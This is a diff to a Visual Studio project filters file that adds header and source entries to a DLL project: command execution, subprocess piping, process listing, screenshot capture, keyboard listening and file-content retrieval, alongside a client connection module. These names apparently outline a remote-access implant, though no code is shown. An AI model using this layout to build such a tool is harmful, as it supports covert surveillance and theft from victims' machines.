@@ -351,6 +351,27 @@
     <ClInclude Include="controller.h">
       <Filter>头文件</Filter>
     </ClInclude>
+    <ClInclude Include="handlers\pipe_subprocess.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="tasks\exec_command.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="tasks\get_process_list.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="include\cpp-base64\base64.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="tasks\get_screenshot.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="tasks\listen_keyboard.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="tasks\get_file_content.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
   </ItemGroup>
   <ItemGroup>
     <ClCompile Include="dllmain.cpp">
@@ -396,6 +417,27 @@
       <Filter>源文件</Filter>
     </ClCompile>
     <ClCompile Include="connection\client.cpp">
+      <Filter>源文件</Filter>
+    </ClCompile>
+    <ClCompile Include="handlers\pipe_subprocess.cpp">
+      <Filter>源文件</Filter>
+    </ClCompile>
+    <ClCompile Include="tasks\exec_command.cpp">
+      <Filter>源文件</Filter>
+    </ClCompile>
+    <ClCompile Include="tasks\get_process_list.cpp">
+      <Filter>源文件</Filter>
+    </ClCompile>
+    <ClCompile Include="include\cpp-base64\base64.cpp">
+      <Filter>源文件</Filter>
+    </ClCompile>
+    <ClCompile Include="tasks\get_screenshot.cpp">
+      <Filter>源文件</Filter>
+    </ClCompile>
+    <ClCompile Include="tasks\listen_keyboard.cpp">
+      <Filter>源文件</Filter>
+    </ClCompile>
+    <ClCompile Include="tasks\get_file_content.cpp">
       <Filter>源文件</Filter>
     </ClCompile>
   </ItemGroup>
